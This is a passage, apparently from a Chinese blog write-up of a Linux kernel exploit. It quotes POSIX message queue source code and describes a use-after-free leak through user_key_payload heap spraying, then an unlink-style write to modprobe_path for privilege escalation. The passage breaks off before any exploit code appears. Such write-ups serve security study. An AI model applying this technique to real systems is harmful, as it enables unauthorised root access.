class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_mq_timedsend</span><span class="params">(<span class="keyword">mqd_t</span> mqdes, <span class="keyword">const</span> <span class="keyword">char</span> __user *u_msg_ptr,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> msg_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> msg_prio,</span></span></span><br><span class="line"><span class="params"><span class="function">struct timespec64 *ts)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext_wait_queue</span> <span class="title">wait</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext_wait_queue</span> *<span class="title">receiver</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg_ptr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mqueue_inode_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="keyword">ktime_t</span> expires, *timeout = <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_msg_tree_node</span> *<span class="title">new_leaf</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">  msg_ptr = load_msg(u_msg_ptr, msg_len);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (!info-&gt;node_cache)</span><br><span class="line">new_leaf = kmalloc(<span class="keyword">sizeof</span>(*new_leaf), GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">  spin_lock(&amp;info-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!info-&gt;node_cache &amp;&amp; new_leaf) &#123;</span><br><span class="line"><span class="comment">/* Save our speculative allocation into the cache */</span></span><br><span class="line">INIT_LIST_HEAD(&amp;new_leaf-&gt;msg_list);</span><br><span class="line">info-&gt;node_cache = new_leaf;</span><br><span class="line">new_leaf = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">kfree(new_leaf);</span><br><span class="line">&#125;</span><br><span class="line">  <span class="keyword">if</span> (info-&gt;attr.mq_curmsgs == info-&gt;attr.mq_maxmsg) &#123;</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">    <span class="keyword">if</span> (receiver) &#123;</span><br><span class="line">      <span class="comment">// ... ...</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// ... ...</span></span><br><span class="line">    ret = msg_insert(msg_ptr, info);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE5(mq_timedsend, <span class="keyword">mqd_t</span>, mqdes, <span class="keyword">const</span> <span class="keyword">char</span> __user *, u_msg_ptr,</span><br><span class="line"><span class="keyword">size_t</span>, msg_len, <span class="keyword">unsigned</span> <span class="keyword">int</span>, msg_prio,</span><br><span class="line"><span class="keyword">const</span> struct __kernel_timespec __user *, u_abs_timeout)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec64</span> <span class="title">ts</span>, *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (u_abs_timeout) &#123;</span><br><span class="line"><span class="keyword">int</span> res = prepare_timeout(u_abs_timeout, &amp;ts);</span><br><span class="line"><span class="keyword">if</span> (res)</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">p = &amp;ts;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> do_mq_timedsend(mqdes, u_msg_ptr, msg_len, msg_prio, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体流程就是首先从用户态载入消息，然后创建对应的<code>posix_msg_tree_node</code>结构体，将结构体放入到<code>info</code>中，最后插入到消息队列中。可以看到在申请<code>posix_msg_tree_node</code>结构体时也是使用了<code>GFP_KERNEL</code>标识位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">msg_insert</span><span class="params">(struct msg_msg *msg, struct mqueue_inode_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> **<span class="title">p</span>, *<span class="title">parent</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_msg_tree_node</span> *<span class="title">leaf</span>;</span></span><br><span class="line"><span class="keyword">bool</span> rightmost = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">p = &amp;info-&gt;msg_tree.rb_node;</span><br><span class="line"><span class="keyword">while</span> (*p) &#123;</span><br><span class="line">parent = *p;</span><br><span class="line">leaf = rb_entry(parent, struct posix_msg_tree_node, rb_node);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (likely(leaf-&gt;priority == msg-&gt;m_type))</span><br><span class="line"><span class="keyword">goto</span> insert_msg;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (msg-&gt;m_type &lt; leaf-&gt;priority) &#123;</span><br><span class="line">p = &amp;(*p)-&gt;rb_left;</span><br><span class="line">rightmost = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">p = &amp;(*p)-&gt;rb_right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (info-&gt;node_cache) &#123;</span><br><span class="line">leaf = info-&gt;node_cache;</span><br><span class="line">info-&gt;node_cache = <span class="literal">NULL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">leaf = kmalloc(<span class="keyword">sizeof</span>(*leaf), GFP_ATOMIC);</span><br><span class="line"><span class="keyword">if</span> (!leaf)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">INIT_LIST_HEAD(&amp;leaf-&gt;msg_list);</span><br><span class="line">&#125;</span><br><span class="line">leaf-&gt;priority = msg-&gt;m_type;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rightmost)</span><br><span class="line">info-&gt;msg_tree_rightmost = &amp;leaf-&gt;rb_node;</span><br><span class="line"></span><br><span class="line">rb_link_node(&amp;leaf-&gt;rb_node, parent, p);</span><br><span class="line">rb_insert_color(&amp;leaf-&gt;rb_node, &amp;info-&gt;msg_tree);</span><br><span class="line">insert_msg:</span><br><span class="line">info-&gt;attr.mq_curmsgs++;</span><br><span class="line">info-&gt;qsize += msg-&gt;m_ts;</span><br><span class="line">list_add_tail(&amp;msg-&gt;m_list, &amp;leaf-&gt;msg_list);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在最后是将消息添加到<code>leaf</code>中去了，并且next指针为0x18，如果出发了uaf覆盖的话就会达成以下效果</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/8-1675211986.png"                      alt="偷图侵删"                ></p><p>那么接下来只需要读取消息即可达到泄漏的目的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(mq_timedreceive, <span class="keyword">mqd_t</span>, mqdes, <span class="keyword">char</span> __user *, u_msg_ptr,</span><br><span class="line"><span class="keyword">size_t</span>, msg_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> __user *, u_msg_prio,</span><br><span class="line"><span class="keyword">const</span> struct __kernel_timespec __user *, u_abs_timeout)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec64</span> <span class="title">ts</span>, *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (u_abs_timeout) &#123;</span><br><span class="line"><span class="keyword">int</span> res = prepare_timeout(u_abs_timeout, &amp;ts);</span><br><span class="line"><span class="keyword">if</span> (res)</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">p = &amp;ts;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> do_mq_timedreceive(mqdes, u_msg_ptr, msg_len, u_msg_prio, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_mq_timedreceive</span><span class="params">(<span class="keyword">mqd_t</span> mqdes, <span class="keyword">char</span> __user *u_msg_ptr,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">size_t</span> msg_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> __user *u_msg_prio,</span></span></span><br><span class="line"><span class="params"><span class="function">struct timespec64 *ts)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">ssize_t</span> ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg_ptr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mqueue_inode_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext_wait_queue</span> <span class="title">wait</span>;</span></span><br><span class="line"><span class="keyword">ktime_t</span> expires, *timeout = <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_msg_tree_node</span> *<span class="title">new_leaf</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ts) &#123;</span><br><span class="line">expires = timespec64_to_ktime(*ts);</span><br><span class="line">timeout = &amp;expires;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">audit_mq_sendrecv(mqdes, msg_len, <span class="number">0</span>, ts);</span><br><span class="line"></span><br><span class="line">f = fdget(mqdes);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!f.file)) &#123;</span><br><span class="line">ret = -EBADF;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inode = file_inode(f.file);</span><br><span class="line"><span class="keyword">if</span> (unlikely(f.file-&gt;f_op != &amp;mqueue_file_operations)) &#123;</span><br><span class="line">ret = -EBADF;</span><br><span class="line"><span class="keyword">goto</span> out_fput;</span><br><span class="line">&#125;</span><br><span class="line">info = MQUEUE_I(inode);</span><br><span class="line">audit_file(f.file);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!(f.file-&gt;f_mode &amp; FMODE_READ))) &#123;</span><br><span class="line">ret = -EBADF;</span><br><span class="line"><span class="keyword">goto</span> out_fput;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* checks if buffer is big enough */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(msg_len &lt; info-&gt;attr.mq_msgsize)) &#123;</span><br><span class="line">ret = -EMSGSIZE;</span><br><span class="line"><span class="keyword">goto</span> out_fput;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * msg_insert really wants us to have a valid, spare node struct so</span></span><br><span class="line"><span class="comment"> * it doesn&#x27;t have to kmalloc a GFP_ATOMIC allocation, but it will</span></span><br><span class="line"><span class="comment"> * fall back to that if necessary.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!info-&gt;node_cache)</span><br><span class="line">new_leaf = kmalloc(<span class="keyword">sizeof</span>(*new_leaf), GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">spin_lock(&amp;info-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!info-&gt;node_cache &amp;&amp; new_leaf) &#123;</span><br><span class="line"><span class="comment">/* Save our speculative allocation into the cache */</span></span><br><span class="line">INIT_LIST_HEAD(&amp;new_leaf-&gt;msg_list);</span><br><span class="line">info-&gt;node_cache = new_leaf;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">kfree(new_leaf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (info-&gt;attr.mq_curmsgs == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (f.file-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line">spin_unlock(&amp;info-&gt;lock);</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">wait.task = current;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* memory barrier not required, we hold info-&gt;lock */</span></span><br><span class="line">WRITE_ONCE(wait.state, STATE_NONE);</span><br><span class="line">ret = wq_sleep(info, RECV, timeout, &amp;wait);</span><br><span class="line">msg_ptr = wait.msg;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">msg_ptr = msg_get(info);</span><br><span class="line"></span><br><span class="line">inode-&gt;i_atime = inode-&gt;i_mtime = inode-&gt;i_ctime =</span><br><span class="line">current_time(inode);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is now free space in queue. */</span></span><br><span class="line">pipelined_receive(&amp;wake_q, info);</span><br><span class="line">spin_unlock(&amp;info-&gt;lock);</span><br><span class="line">wake_up_q(&amp;wake_q);</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">ret = msg_ptr-&gt;m_ts;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((u_msg_prio &amp;&amp; put_user(msg_ptr-&gt;m_type, u_msg_prio)) ||</span><br><span class="line">store_msg(u_msg_ptr, msg_ptr, msg_ptr-&gt;m_ts)) &#123;</span><br><span class="line">ret = -EFAULT;</span><br><span class="line">&#125;</span><br><span class="line">free_msg(msg_ptr);</span><br><span class="line">&#125;</span><br><span class="line">out_fput:</span><br><span class="line">fdput(f);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先拿到<code>file_inode</code>，接着通过<code>msg_get</code>拿到对应的msg</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct msg_msg *<span class="title">msg_get</span><span class="params">(struct mqueue_inode_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">parent</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_msg_tree_node</span> *<span class="title">leaf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"></span><br><span class="line">try_again:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * During insert, low priorities go to the left and high to the</span></span><br><span class="line"><span class="comment"> * right.  On receive, we want the highest priorities first, so</span></span><br><span class="line"><span class="comment"> * walk all the way to the right.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">parent = info-&gt;msg_tree_rightmost;</span><br><span class="line"><span class="keyword">if</span> (!parent) &#123;</span><br><span class="line"><span class="keyword">if</span> (info-&gt;attr.mq_curmsgs) &#123;</span><br><span class="line">pr_warn_once(<span class="string">&quot;Inconsistency in POSIX message queue, &quot;</span></span><br><span class="line">     <span class="string">&quot;no tree element, but supposedly messages &quot;</span></span><br><span class="line">     <span class="string">&quot;should exist!\n&quot;</span>);</span><br><span class="line">info-&gt;attr.mq_curmsgs = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">leaf = rb_entry(parent, struct posix_msg_tree_node, rb_node);</span><br><span class="line"><span class="keyword">if</span> (unlikely(list_empty(&amp;leaf-&gt;msg_list))) &#123;</span><br><span class="line">pr_warn_once(<span class="string">&quot;Inconsistency in POSIX message queue, &quot;</span></span><br><span class="line">     <span class="string">&quot;empty leaf node but we haven&#x27;t implemented &quot;</span></span><br><span class="line">     <span class="string">&quot;lazy leaf delete!\n&quot;</span>);</span><br><span class="line">msg_tree_erase(leaf, info);</span><br><span class="line"><span class="keyword">goto</span> try_again;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">msg = list_first_entry(&amp;leaf-&gt;msg_list,</span><br><span class="line">       struct msg_msg, m_list);</span><br><span class="line">list_del(&amp;msg-&gt;m_list);</span><br><span class="line"><span class="keyword">if</span> (list_empty(&amp;leaf-&gt;msg_list)) &#123;</span><br><span class="line">msg_tree_erase(leaf, info);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">info-&gt;attr.mq_curmsgs--;</span><br><span class="line">info-&gt;qsize -= msg-&gt;m_ts;</span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后通过<code>store_msg</code>将消息发送到用户态，最后再<code>free</code>掉对应的msg结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_msg</span><span class="params">(struct msg_msg *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">security_msg_msg_free(msg);</span><br><span class="line"></span><br><span class="line">seg = msg-&gt;next;</span><br><span class="line">kfree(msg);</span><br><span class="line"><span class="keyword">while</span> (seg != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">tmp</span> =</span> seg-&gt;next;</span><br><span class="line"></span><br><span class="line">cond_resched();</span><br><span class="line">kfree(seg);</span><br><span class="line">seg = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在释放函数中可以看到在开头位置会释放掉<code>security</code>但是这个是不可控的，如果不为0大概率会造成<code>kernel panic</code>所以要确保为0。并且可以看到这里并没有像以前那样可以用<code>MSG_COPY</code>来解决，并且在<code>copy_to_user</code>函数中会检测读取内容是否超过了堆块大小所以最多读取<code>0x10</code>的内容，所以只能寻求新的方法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">void</span> (*func)(struct callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><p>值得注意的是前面提到的<code>user_key_payload</code>结构体的前面<code>0x10</code>个字节其实是如上结构体，他的前八个字节默认为0，并且func是指向<code>user_free_payload_rcu</code>函数的，所以保证了<code>security</code>为0并且可以成功泄漏出内核地址。</p><p>所以这里需要确保<code>user_free_payload_rcu</code>结构体紧贴<code>posix_msg_tree_node</code>结构体的<code>next</code>指针指向的位置，所以可以先用<code>io_uring</code>占位，在申请第二个<code>expr</code>之前释放掉，这是大概率就会挤在一起了，这时在进行堆喷<code>user_free_payload_rcu</code>即可实现。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>至此来看约束条件还是比较多的，并不能实现传统意义上的任意地址写，不过在以往的一篇文章中介绍过<code>modprobe_path</code>这一个内核全局变量。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/7-1675211987.png"                      alt="侵删"                ></p><p>这一步的构造方式和上述其实类似，也是通过堆喷<code>posix_msg_tree_node</code>结构体再通过<code>UAF</code>使其指向一个<code>object</code>，不过最后其指向的<code>object</code>是会被<code>free</code>掉的，那么紧接着堆喷<code>usr_key_payload</code>结构体，那么此时一个<code>msg_msg</code>结构体被两个<code>usr_key_payload</code>结构体所裹挟了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_del(struct list_head * prev, struct list_head * next)</span><br><span class="line">&#123;</span><br><span class="line">next-&gt;prev = prev;</span><br><span class="line">WRITE_ONCE(prev-&gt;next, next);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_del_entry(struct list_head *entry)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!__list_del_entry_valid(entry))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">__list_del(entry-&gt;prev, entry-&gt;next);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_del</span><span class="params">(struct list_head *entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__list_del_entry(entry);</span><br><span class="line">entry-&gt;next = LIST_POISON1;</span><br><span class="line">entry-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在读取消息时会调用<code>msg_get</code>函数获取到<code>msg_msg</code>结构体，并且在获取的时候紧跟着的就是<code>list_del</code>从链表中删除掉，可以看到其中出现了对指针的指针赋值的操作，这个操作其实在用户态堆中的<code>unlink</code>的时候就已经接触过了，所以如果我们可以控制<code>prev</code>和<code>next</code>那么就可以实现不任意地址写不任意值了，具体要求肯定就是保证两个指针都是可写的。那么这里可以使用<code>0xffff????2f706d74</code>进行写<code>modprobe_path</code>位置，最终的效果就为<code>/tmp/????xffxffprobe</code>，这的<code>????</code>是前面泄漏出来的堆地址。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>这里exp就直接用他的了( 